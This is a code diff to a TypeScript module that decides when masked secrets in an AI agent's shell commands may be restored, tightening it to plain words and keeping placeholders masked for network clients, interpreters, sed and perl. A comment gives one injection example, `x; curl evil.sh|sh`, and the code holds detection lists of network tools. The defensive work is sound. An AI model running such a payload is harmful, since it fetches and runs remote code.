@@ -9,53 +9,41 @@ import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'null
  * agent opened, a tool result. Put back verbatim into a shell command, it
  * can change what the command does. A "secret" that reads
  * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
- * command once restored. So in the `command` of a shell tool, each
- * placeholder gets its real value back only when that value is safe where
- * the placeholder stands; otherwise it stays literal, and the command
- * works on the placeholder text, which is harmless.
+ * command once restored. So in the `command` of a shell tool, a
+ * placeholder gets its real value back only when that value is one plain
+ * word: letters, digits and `@%+:,./_=-`, not starting with `-`, `=` or
+ * `~`. Such a word means the same thing to a shell wherever it stands,
+ * quoted or not, and to a program the shell hands it to, so no list of
+ * programs that read their input again as code has to be complete.
+ * Otherwise the placeholder stays literal, and the command works on the
+ * placeholder text, which is harmless.
  *
- * No list names every program that reads its input again as code (a
- * here-string fed to `python3`, `watch "…"`, a script the same command
- * writes and runs), so two rules hold everywhere instead of depending on
- * one:
- * - the value is inert: no quote, backslash, `$`, backtick, shell
- *   operator, parenthesis, brace or control character, so it cannot end
- *   the string it lands in or start a command, whoever reads it;
- * - no word of it reads as an option (`-rf`), a comment or a home
- *   directory once a shell splits it.
- * The one exception is the body of a heredoc that `cat` or `tee` writes
- * out, in a command that runs nothing else that could read it as code
- * (`cat > notes.md <<'EOF'`, a `git commit -m "$(cat <<'EOF' …)"`
- * message): that body is data, as a file the `Write` tool writes is, so
- * only a line break is refused (and in a bare-delimiter body, which
- * expands, `$`, a backtick or a backslash).
- *
- * On top of them, in order:
+ * On top of that:
+ * - a placeholder that is, or is part of, the program a simple command
+ *   runs (also behind `sudo`, `env`, `timeout`, …) stays masked: a value
+ *   must not choose what runs;
  * - a command that sends data off the machine (`curl`, `ssh`, `gh`,
- *   `git push`, `dig`, …, also behind `sudo`, `env` or `timeout`) keeps
- *   every placeholder: the tool runs here, but the value would leave
- *   through it;
- * - a command that runs an interpreter or a program that evaluates its
- *   arguments (`bash`, `python3`, `node`, `eval`, `xargs`, `watch`, `make`,
- *   …, by name, by path or behind a wrapper), a program named by an
- *   expansion (`$PY`), or code handed on inside an argument
- *   (`docker run img sh -c "…"`) gets the strictest rule everywhere: one
- *   plain word;
- * - a heredoc body fed to anything but `cat` or `tee`, piped on, without
- *   its closing line, or in a command that runs a file (`./run.sh`,
- *   `chmod +x`): the strictest rule;
- * - otherwise the shell quoting: single quotes, `$'…'`, double quotes,
- *   backslash escapes, and command substitutions (`$(…)`, backticks),
- *   which are unquoted even inside double quotes.
+ *   `git push`, `dig`, …, a URL handed to a program that is not a data
+ *   one, also behind a wrapper) keeps every placeholder: the tool runs
+ *   here, but the value would leave through it;
+ * - the one exception to the plain-word rule is the body of a heredoc that
+ *   `cat` or `tee` writes out, in a command that runs nothing else that
+ *   could read it as code (`cat > notes.md <<'EOF'`, a
+ *   `git commit -m "$(cat <<'EOF' …)"` message): that body is data, as a
+ *   file the `Write` tool writes is, so only a line break is refused (and
+ *   in a bare-delimiter body, which expands, `$`, a backtick or a
+ *   backslash). The network checks skip such a body, so a commit message
+ *   that mentions `ssh` does not count as a network call.
  *
- * Heredoc bodies and `#` comments are skipped by the quote lexer (an
- * apostrophe in either does not open a quote for the rest of the
- * command); `<<` counts only in shell code, never inside quotes or as the
- * here-string `<<<`. The command is read once, whatever the number of
- * placeholders. A `command` given as an argv array
- * (`["bash", "-lc", "…"]`) is judged by `restoreShellArgv`. The Claude
- * Code mod gets the same rules through the sidecar's `restore` with
- * `tool`.
+ * The command is read once, in time linear in its length, whatever the
+ * number of placeholders; a command longer than `MAX_COMMAND_CHARS`, or
+ * one whose quoting or substitutions are left open, keeps every
+ * placeholder or loses the heredoc exception. Heredoc bodies and `#`
+ * comments are skipped by the quote lexer; `<<` counts only in shell code,
+ * never inside quotes or as the here-string `<<<`. A `command` given as an
+ * argv array (`["bash", "-lc", "…"]`) is judged by `restoreShellArgv`.
+ * The Claude Code mod gets the same rules through the sidecar's `restore`
+ * with `tool`.
  *
  * Best effort for what leaves the machine: no list names every network
  * client, and a value restored into a file (`Write`, `Edit`) can be sent
@@ -78,29 +66,23 @@ export type QuoteContext = 'none' | 'single' | 'double' | 'heredoc' | 'heredoc-e
 /** Contexts that hold data a program writes out, not shell code. */
 const DATA_BODY_CONTEXTS: ReadonlySet<QuoteContext> = new Set(['heredoc', 'heredoc-expanding']);
 
-/** What a value restored into shell code must not hold: quotes,
- * backslash, `$`, backtick, operators, parentheses, braces, and control
- * characters (line breaks included). Without them a value cannot end the
- * string it lands in or start a command, in the shell or in a program the
- * shell hands it to. */
-const SHELL_INERT = /^[^'"`\\$;&|<>(){}\p{Cc}\u2028\u2029]*$/u;
+/** A value that may be restored outside a data heredoc body: one plain
+ * word, with no character any shell or quoting gives a meaning to, and
+ * not starting with `-` (an option), `=` (zsh's `=cmd` expansion) or `~`
+ * (a home directory). */
+const PLAIN_WORD = /^(?![-=~])[\p{L}\p{N}@%+:,./_=-]+$/u;
 
-/** A word of the value that a command would read as an option (`-rf`,
- * `--upload-pack=…`), or that would start a comment or a home directory,
- * once a shell splits the value into words. */
-const SPECIAL_WORD = /^[-#~]|\s(?:-\S|[#~])/u;
-
-/** What a value may hold in each context, on top of `SHELL_INERT` and
- * `SPECIAL_WORD` outside data bodies. */
-const SHELL_SAFE: Readonly<Record<QuoteContext, RegExp>> = {
-  none: /^[A-Za-z0-9@%+=:,./_-]+$/,
-  single: /^[^'\n]*$/,
-  double: /^[^"$`\\!\n]*$/,
+/** What a value may hold in a data heredoc body. */
+const DATA_BODY_SAFE: Readonly<Record<'heredoc' | 'heredoc-expanding', RegExp>> = {
   // A quoted-delimiter body is literal; only a newline could end it early,
   // with the delimiter on a line of its own.
-  heredoc: /^[^\n]*$/,
-  'heredoc-expanding': /^[^$`\\\n]*$/,
+  heredoc: /^[^\n\u2028\u2029]*$/u,
+  'heredoc-expanding': /^[^$`\\\n\u2028\u2029]*$/u,
 };
+
+/** Longest command read: a longer one keeps every placeholder, so the
+ * work per tool call stays bounded whatever the model sends. */
+export const MAX_COMMAND_CHARS = 256 * 1024;
 
 /** The rest of one simple command, up to a bound: from an interpreter's
  * name to its code flag, past other options and their arguments. */
@@ -189,6 +171,9 @@ const CODE_RUNNERS: ReadonlySet<string> = new Set([
   'make',
   'gmake',
   'just',
+  'npx',
+  'pnpx',
+  'bunx',
 ]);
 
 /** Programs that run the program named after their own options, with the
@@ -203,6 +188,7 @@ const WRAPPERS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
   ['exec', new Set(['-a'])],
   ['time', new Set(['-f', '-o', '--format', '--output'])],
   ['timeout', new Set(['-s', '-k', '--signal', '--kill-after'])],
+  ['gtimeout', new Set(['-s', '-k', '--signal', '--kill-after'])],
   ['nice', new Set(['-n', '--adjustment'])],
   ['ionice', new Set(['-c', '-n', '-p', '-P', '-u'])],
   ['stdbuf', new Set(['-i', '-o', '-e'])],
@@ -215,7 +201,10 @@ const WRAPPERS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
 
 /** Wrappers that take a positional argument before the program
  * (`timeout 5 cmd`). */
-const WRAPPER_POSITIONALS: ReadonlyMap<string, number> = new Map([['timeout', 1]]);
+const WRAPPER_POSITIONALS: ReadonlyMap<string, number> = new Map([
+  ['timeout', 1],
+  ['gtimeout', 1],
+]);
 
 /** Wrapper options that make it run a shell on a string, not a program
  * (`sudo -s`, `sudo -i`, `env -S "…"`). */
@@ -349,8 +338,11 @@ const NETWORK_CLIENT = new RegExp(
 
 /** In a command that runs code: a URL, a networking library, or a short
  * network client name, which that code may use. */
+/** A URL: handed to a program that is not a data one, it may be opened. */
+const URL_SCHEME = /(?<![a-z0-9+.-])[a-z][a-z0-9+.-]{0,31}:\/\//i;
+
 const NETWORK_IN_CODE =
-  /[a-z][a-z0-9+.-]*:\/\/|\b(?:requests|urllib|httpx|aiohttp|socket|fetch|axios|XMLHttpRequest|WebSocket|LWP|IO::Socket|Net::HTTP|http\.client|net\.connect|nc|gh|dig|ping|ftp|xh|aws)\b/;
+  /(?<![a-z0-9+.-])[a-z][a-z0-9+.-]{0,31}:\/\/|\b(?:requests|urllib|httpx|aiohttp|socket|fetch|axios|XMLHttpRequest|WebSocket|LWP|IO::Socket|Net::HTTP|http\.client|net\.connect|nc|gh|dig|ping|ftp|xh|aws)\b/;
 
 /** Programs whose arguments and input are data, so that a heredoc body
  * in a command that runs only these is data too. */
@@ -368,8 +360,26 @@ const DATA_PROGRAMS: ReadonlySet<string> = new Set([
   ':',
 ]);
 
-/** `git` subcommands whose heredoc arguments are data (a commit message). */
-const DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set(['commit']);
+/** `git` subcommands that read their arguments as data and run no code
+ * on them, so a commit message heredoc in `git add … && git commit …`
+ * stays data. */
+const DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
+  'commit',
+  'add',
+  'rm',
+  'mv',
+  'status',
+  'diff',
+  'log',
+  'show',
+]);
+
+/** Programs whose code can be ended by any character, letters included,
+ * and that can then run a command: `sed`'s `s` takes any delimiter and an
+ * `e` flag, `perl`'s `s///e` too. Not even a plain word is safe in their
+ * code, so a command that runs one keeps every placeholder. */
+const ANY_DELIMITER_PROGRAMS: ReadonlySet<string> = new Set(['sed', 'gsed', 'perl']);
+const ANY_DELIMITER_IN_TEXT = /(?<![\w.-])(?:g?sed|perl)(?![\w.-])/;
 
 /** Programs that make a file executable, to run it. */
 const RUNS_FILE_PROGRAMS: ReadonlySet<string> = new Set(['chmod']);
@@ -409,14 +419,15 @@ const MAX_WORD_SCAN = 4096;
 /** A heredoc operator, read at one position: `<<` or `<<-`, then a
  * delimiter that is quoted (`'EOF'`, `"EOF"`), backslash-escaped (`\EOF`)
  * or bare (`EOF`). Groups: 1 dash, 3 quoted word, 4 escaped word, 5 bare. */
-const HEREDOC_OPERATOR = /<<(-?)[ \t]*(?:(['"])([A-Za-z_]\w*)\2|\\([A-Za-z_]\w*)|([A-Za-z_]\w*))/;
+const HEREDOC_OPERATOR =
+  /<<(-?)[ \t]*(?:(['"])([A-Za-z_]\w*)\2|\\([A-Za-z_]\w*)|([A-Za-z_]\w*))(?=[\s;&|<>()]|$)/;
 
 /** Commands whose heredoc body is data, not code. */
 const HEREDOC_DATA_COMMANDS: ReadonlySet<string> = new Set(['cat', 'tee']);
 
 /** Characters after which a new simple command starts (see
  * `separatesCommands`). */
-const COMMAND_SEPARATORS: ReadonlySet<string> = new Set([';', '&', '|', '\n', '(', '{']);
+const COMMAND_SEPARATORS: ReadonlySet<string> = new Set([';', '&', '|', '\n', '(', ')', '{']);
 const REDIRECTION_SIDES: ReadonlySet<string> = new Set(['<', '>']);
 
 /** Characters after which `#` starts a comment: it must begin a word.
@@ -479,6 +490,16 @@ interface Scan {
   readonly targets: readonly number[];
   readonly contexts: QuoteContext[];
   readonly commands: Array<readonly [number, number]>;
+  /** The extent of every heredoc body written out as data. */
+  readonly dataBodies: Array<readonly [number, number]>;
+  /** The line the last `<<` was met on, and its last `|`, read once per
+   * line so that many operators on one line cost linear time. */
+  line: { end: number; lastPipe: number };
+  /** The program word of the simple command the last `<<` was met in,
+   * by the command's start, read once per command. */
+  heredocCommand: { start: number; word: string };
+  /** `HEREDOC_OPERATOR`, sticky, for this scan alone. */
+  readonly heredocOperator: RegExp;
 }
 
 /** A word of a simple command, quotes and escapes removed; `computed`
@@ -505,11 +526,19 @@ interface Program {
 
 /** What a command does, as far as restoring into it is concerned. */
 interface Verdict {
-  /** It sends data off the machine: nothing is restored. */
+  /** It sends data off the machine, runs a program in whose code no
+   * value is safe (`sed`, `perl`), or is too long to read: nothing is
+   * restored. */
   readonly offMachine: boolean;
   /** The context at each placeholder position, keyed by index. */
   readonly contextAt: ReadonlyMap<number, QuoteContext>;
+  /** The placeholder positions that are, or are part of, the program a
+   * simple command runs. */
+  readonly programAt: ReadonlySet<number>;
 }
+
+/** Stands for a placeholder when the words before it are read. */
+const PLACEHOLDER_STAND_IN = 'x';
 
 /** True when `name` is one of the `SHELL_TOOLS`. */
 export function isShellTool(name: unknown): boolean {
@@ -523,13 +552,13 @@ export function sendsOffMachine(command: string): boolean {
   return judge(command, []).offMachine;
 }
 
-/** True when `value` can be put back as written in `context`: inert and
- * with no special word outside a data body, and within the context's own
- * rule everywhere. */
+/** True when `value` can be put back as written in `context`: one plain
+ * word, or in a data heredoc body a value that cannot end the body. */
 export function shellSafe(value: string, context: QuoteContext): boolean {
-  if (DATA_BODY_CONTEXTS.has(context)) return SHELL_SAFE[context].test(value);
-  if (SPECIAL_WORD.test(value) || !SHELL_INERT.test(value)) return false;
-  return SHELL_SAFE[context].test(value);
+  if (context === 'heredoc' || context === 'heredoc-expanding') {
+    return DATA_BODY_SAFE[context].test(value);
+  }
+  return PLAIN_WORD.test(value);
 }
 
 /**
@@ -543,26 +572,110 @@ export function shellContextAt(command: string, index: number): QuoteContext {
 
 /** Read `command` once and judge it at each of `targets` (ascending). */
 function judge(command: string, targets: readonly number[]): Verdict {
-  const scan: Scan = { targets, contexts: [], commands: [] };
-  lex(command, 0, command.length, codeFrame(), scan);
+  if (command.length > MAX_COMMAND_CHARS) {
+    return { offMachine: true, contextAt: new Map(), programAt: new Set() };
+  }
+  const scan: Scan = {
+    targets,
+    contexts: [],
+    commands: [],
+    dataBodies: [],
+    line: { end: -1, lastPipe: -1 },
+    heredocCommand: { start: -1, word: '' },
+    heredocOperator: new RegExp(HEREDOC_OPERATOR.source, 'y'),
+  };
+  const closed = lex(command, 0, command.length, codeFrame(), scan);
   const programs = scan.commands.flatMap(([start, end]) => {
     const p = programOf(wordsOf(command.slice(start, Math.min(end, start + MAX_WORD_SCAN))));
     return p === undefined ? [] : [p];
   });
-  const strict = NESTED_INTERPRETER.test(command) || programs.some(runsCode);
+  // Data bodies are text written out, not commands: a commit message that
+  // mentions `ssh` or `bash -c` neither sends nor runs anything.
+  const code = withoutRanges(command, scan.dataBodies);
+  const strict = NESTED_INTERPRETER.test(code) || programs.some(runsCode);
+  // `offMachine` also covers a program whose code no word is safe in.
   const offMachine =
-    NETWORK_CLIENT.test(command) ||
+    ANY_DELIMITER_IN_TEXT.test(code) ||
+    programs.some((p) => p.name !== undefined && ANY_DELIMITER_PROGRAMS.has(p.name)) ||
+    NETWORK_CLIENT.test(code) ||
     programs.some(sendsOut) ||
-    (strict && NETWORK_IN_CODE.test(command));
-  const bodyContext = dataBodyContext(programs, strict);
+    (strict && NETWORK_IN_CODE.test(code)) ||
+    (URL_SCHEME.test(code) && !programs.every(isDataProgram));
+  const bodyContext = dataBodyContext(programs, strict || !closed);
   const contextAt = new Map<number, QuoteContext>();
+  const programAt = new Set<number>();
+  const settled = new Map<number, boolean>();
   targets.forEach((index, k) => {
     const context = scan.contexts[k] ?? 'none';
     if (strict) contextAt.set(index, 'none');
     else if (DATA_BODY_CONTEXTS.has(context)) contextAt.set(index, bodyContext(context));
     else contextAt.set(index, context);
+    if (startsProgramAt(command, index, scan.commands, settled)) programAt.add(index);
   });
-  return { offMachine, contextAt };
+  return { offMachine, contextAt, programAt };
+}
+
+/** `text` with each of `ranges` blanked out, offsets kept. */
+function withoutRanges(text: string, ranges: ReadonlyArray<readonly [number, number]>): string {
+  let out = '';
+  let last = 0;
+  for (const [start, end] of ranges) {
+    out += text.slice(last, start) + ' '.repeat(end - start);
+    last = end;
+  }
+  return out + text.slice(last);
+}
+
+/** True when the placeholder at `index` stands in the program word of the
+ * innermost simple command around it: the words before it are only
+ * keywords, assignments, redirections and wrappers. Past the first
+ * `MAX_WORD_SCAN` characters of a command, it is the program unless one
+ * was already read there (`settled`, per command start). */
+function startsProgramAt(
+  command: string,
+  index: number,
+  commands: ReadonlyArray<readonly [number, number]>,
+  settled: Map<number, boolean>,
+): boolean {
+  let start: number | undefined;
+  for (const [s, e] of commands) {
+    if (s <= index && index <= e && (start === undefined || s > start)) start = s;
+  }
+  if (start === undefined) return false;
+  if (index - start > MAX_WORD_SCAN) return !programSettled(command, start, settled);
+  const words = wordsOf(command.slice(start, index) + PLACEHOLDER_STAND_IN);
+  if (words.length >= MAX_WORDS) return false;
+  const own = words.at(-1);
+  if (own === undefined || ENV_ASSIGNMENT.test(own.text) || REDIRECTION.test(own.text))
+    return false;
+  return programIsNext(words.slice(0, -1));
+}
+
+/** True when the command starting at `start` names its program within
+ * its first `MAX_WORD_SCAN` characters, followed by another word. */
+function programSettled(command: string, start: number, settled: Map<number, boolean>): boolean {
+  const known = settled.get(start);
+  if (known !== undefined) return known;
+  const words = wordsOf(command.slice(start, start + MAX_WORD_SCAN));
+  let found = false;
+  for (let k = 1; k < words.length && !found; k++) found = !programIsNext(words.slice(0, k));
+  settled.set(start, found);
+  return found;
+}
+
+/** True when the word after `words` would be the program they run. */
+function programIsNext(words: readonly Word[]): boolean {
+  let k = skipPrefix(words, 0);
+  const first = words[k];
+  if (first !== undefined && NO_PROGRAM_KEYWORDS.has(first.text)) return false;
+  for (;;) {
+    const word = words[k];
+    if (word === undefined) return true;
+    const name = word.computed ? undefined : normalise(word.text);
+    const options = name === undefined ? undefined : WRAPPERS.get(name);
+    if (options === undefined || name === undefined) return false;
+    k = skipWrapperArgs(words, k + 1, name, options).next;
+  }
 }
 
 /** What a data heredoc body's context becomes, given the programs the
@@ -740,7 +853,7 @@ function codeFrame(): Frame {
 /** Lex `command` from `start` to `end`, with `base` as the nesting in
  * force at `start`: record the context at each target in range, and the
  * extent of each simple command of shell code. */
-function lex(command: string, start: number, end: number, base: Frame, scan: Scan): void {
+function lex(command: string, start: number, end: number, base: Frame, scan: Scan): boolean {
   const stack: Frame[] = [base];
   const pending: Heredoc[] = [];
   let i = start;
@@ -754,7 +867,7 @@ function lex(command: string, start: number, end: number, base: Frame, scan: Sca
       // so what follows it, is unknown.
       if (next === undefined) {
         record(scan, Number.POSITIVE_INFINITY, 'none');
-        return;
+        return false;
       }
       pending.length = 0;
       frame.cmdStart = next;
@@ -767,6 +880,7 @@ function lex(command: string, start: number, end: number, base: Frame, scan: Sca
   for (const frame of stack) {
     if (CODE_KINDS.has(frame.kind)) scan.commands.push([frame.cmdStart, end]);
   }
+  return stack.length === 1 && pending.length === 0;
 }
 
 /** Give `context` to every target not yet recorded up to `limit`. */
@@ -834,7 +948,9 @@ function advanceCode(
 ): number {
   const ch = command[i];
   if (ch === '#' && startsWord(command, i)) return commentLength(command, i);
-  if (ch === '<' && command[i + 1] === '<') return readHeredocOperator(command, i, frame, pending);
+  if (ch === '<' && command[i + 1] === '<') {
+    return readHeredocOperator(command, i, frame, pending, scan);
+  }
   if (ch === '$' && command[i + 1] === "'") {
     stack.push({ kind: 'ansi', depth: 0, cmdStart: 0 });
     return 2;
@@ -894,26 +1010,51 @@ function closeCommand(stack: Frame[], frame: Frame, i: number, scan: Scan): void
 
 /** Record the heredoc whose operator starts at `i`; return its length.
  * `<<<` is a here-string: the word after it is an ordinary argument. */
-function readHeredocOperator(command: string, i: number, frame: Frame, pending: Heredoc[]): number {
+function readHeredocOperator(
+  command: string,
+  i: number,
+  frame: Frame,
+  pending: Heredoc[],
+  scan: Scan,
+): number {
   if (command[i + 2] === '<') return 3;
-  const operator = new RegExp(HEREDOC_OPERATOR.source, 'y');
-  operator.lastIndex = i;
-  const m = operator.exec(command);
+  scan.heredocOperator.lastIndex = i;
+  const m = scan.heredocOperator.exec(command);
   if (m === null) {
     pending.push({ delimiter: undefined, literal: false, stripTabs: false, data: false });
     return 2;
   }
-  const newline = command.indexOf('\n', i);
-  const restOfLine = command.slice(i, newline === -1 ? command.length : newline);
-  const word = commandWord(command.slice(frame.cmdStart, i));
+  if (scan.heredocCommand.start !== frame.cmdStart) {
+    const head = command.slice(frame.cmdStart, Math.min(i, frame.cmdStart + MAX_WORD_SCAN));
+    scan.heredocCommand = { start: frame.cmdStart, word: commandWord(head) };
+  }
+  const word = scan.heredocCommand.word;
   const quoted = m[3] ?? m[4];
   pending.push({
     delimiter: quoted ?? m[5],
     literal: quoted !== undefined,
     stripTabs: m[1] === '-',
-    data: HEREDOC_DATA_COMMANDS.has(word) && !restOfLine.includes('|'),
+    data: HEREDOC_DATA_COMMANDS.has(word) && !pipedLater(command, i, scan),
   });
   return m[0].length;
+}
+
+/** True when a `|` follows `i` on its line. The line's end and last `|`
+ * are found once per line. */
+function pipedLater(command: string, i: number, scan: Scan): boolean {
+  if (i > scan.line.end) {
+    const newline = command.indexOf('\n', i);
+    const end = newline === -1 ? command.length : newline;
+    let lastPipe = -1;
+    for (let k = end - 1; k > i; k--) {
+      if (command[k] === '|') {
+        lastPipe = k;
+        break;
+      }
+    }
+    scan.line = { end, lastPipe };
+  }
+  return scan.line.lastPipe > i;
 }
 
 /** The program a simple command runs: its first word that is not an
@@ -948,6 +1089,10 @@ function readHeredocBodies(
 /** Record the targets in one body. A bare-delimiter body is lexed too,
  * since its substitutions run whatever reads the body. */
 function readBody(command: string, start: number, end: number, heredoc: Heredoc, scan: Scan): void {
+  // A body that expands keeps its substitutions in the text the network
+  // checks read; one with none is plain text.
+  const expands = !heredoc.literal && /[$`]/.test(command.slice(start, end));
+  if (heredoc.data && !expands) scan.dataBodies.push([start, end]);
   if (!heredoc.data) record(scan, end - 1, 'none');
   else if (heredoc.literal) record(scan, end - 1, 'heredoc');
   if (heredoc.literal) return;
@@ -1003,9 +1148,10 @@ export function restoreShellCommand(
 ): ShellRestore {
   const starts = [...command.matchAll(placeholderPattern())].map((m) => m.index);
   const verdict = judge(command, starts);
-  return restoreEach(np, command, sessionId, (value, at) =>
-    verdict.offMachine ? false : shellSafe(value, verdict.contextAt.get(at) ?? 'none'),
-  );
+  return restoreEach(np, command, sessionId, (value, at) => {
+    if (verdict.offMachine || verdict.programAt.has(at)) return false;
+    return shellSafe(value, verdict.contextAt.get(at) ?? 'none');
+  });
 }
 
 /** A shell `command` given as an argv array, with its safe placeholders
@@ -1019,15 +1165,13 @@ export interface ShellArgvRestore {
 /**
  * Restore the placeholders of a `command` given as an argv array, as
  * Codex's `shell` tool sends it (`["bash", "-lc", "…"]`). The program
- * runs without a shell, so each argument is taken literally and a value
- * needs only to be inert (the program may still read it again), unless:
- * - the program sends data off the machine, or runs code that may: nothing
- *   is restored;
- * - the program runs code (`bash -lc`, `python3`, `xargs`, also behind a
- *   wrapper or a path), or an argument hands code to an interpreter: every
- *   argument gets the strictest rule, as in a string command;
- * - the value would be the program itself, or start an argument with `-`,
- *   where it would be read as an option: the strictest rule.
+ * runs without a shell, but the same rules hold as in a string command:
+ * - nothing is restored when the program sends data off the machine, or
+ *   runs code that may;
+ * - a value is restored only as one plain word, and never into the program
+ *   itself;
+ * - the script a shell runs (`bash -lc "…"`) is judged as a string
+ *   command, program positions and data heredocs included.
  *
  * @param np - the engine whose vault holds `sessionId`.
  */
@@ -1036,21 +1180,58 @@ export function restoreShellArgv(
   argv: readonly string[],
   sessionId: string,
 ): ShellArgvRestore {
-  const offline = !argvSendsOffMachine(argv);
-  const code = argvRunsCode(argv);
+  const length = argv.reduce((n, a) => n + a.length, 0);
+  const offline = length <= MAX_COMMAND_CHARS && !argvSendsOffMachine(argv);
+  const program = argvProgramIndex(argv);
+  const script = shellScriptIndex(argv, program);
   const results: RestoreResult[] = [];
   const keptMasked: string[] = [];
   const restored = argv.map((word, position) => {
-    const r = restoreEach(np, word, sessionId, (value, at) => {
-      if (!offline) return false;
-      if (code || position === 0) return shellSafe(value, 'none');
-      return (at > 0 || !value.startsWith('-')) && SHELL_INERT.test(value);
-    });
+    const r =
+      position === script && offline
+        ? restoreShellCommand(np, word, sessionId)
+        : restoreEach(
+            np,
+            word,
+            sessionId,
+            (value) => offline && position !== program && PLAIN_WORD.test(value),
+          );
     results.push(...r.results);
     keptMasked.push(...r.keptMasked);
     return r.command;
   });
   return { argv: restored, results, keptMasked };
+}
+
+/** Shells whose `-c` argument is a script. */
+const ARGV_SHELLS: ReadonlySet<string> = new Set(['bash', 'sh', 'zsh', 'dash', 'ksh', 'mksh']);
+/** A shell option cluster that holds `c`: the next argument is the script. */
+const SCRIPT_FLAG = /^-[A-Za-z]*c[A-Za-z]*$/;
+
+/** The index of the program an argv array runs, past keywords,
+ * assignments, redirections and wrappers. */
+function argvProgramIndex(argv: readonly string[]): number {
+  const words = argv.map((text) => ({ text, computed: false }));
+  let k = skipPrefix(words, 0);
+  for (;;) {
+    const text = words[k]?.text;
+    if (text === undefined) return k;
+    const name = normalise(text);
+    const options = WRAPPERS.get(name);
+    if (options === undefined) return k;
+    k = skipWrapperArgs(words, k + 1, name, options).next;
+  }
+}
+
+/** The index of the script a shell program runs with `-c`, or -1. */
+function shellScriptIndex(argv: readonly string[], program: number): number {
+  const name = argv[program];
+  if (name === undefined || !ARGV_SHELLS.has(normalise(name))) return -1;
+  for (let k = program + 1; k < argv.length; k++) {
+    if (SCRIPT_FLAG.test(argv[k] ?? '')) return k + 1;
+    if (!(argv[k] ?? '').startsWith('-')) return -1;
+  }
+  return -1;
 }
 
 /** The program an argv array runs, every word literal. */
@@ -1071,6 +1252,8 @@ function argvRunsCode(argv: readonly string[]): boolean {
 function argvSendsOffMachine(argv: readonly string[]): boolean {
   const program = argvProgram(argv);
   if (program !== undefined && sendsOut(program)) return true;
+  if (program?.name !== undefined && ANY_DELIMITER_PROGRAMS.has(program.name)) return true;
+  if (argv.some((a) => ANY_DELIMITER_IN_TEXT.test(a))) return true;
   if (argv.some((a) => NETWORK_CLIENT.test(a))) return true;
   if (!argvRunsCode(argv)) return false;
   return argv.some((a) => NETWORK_IN_CODE.test(a) || sendsOffMachine(a));
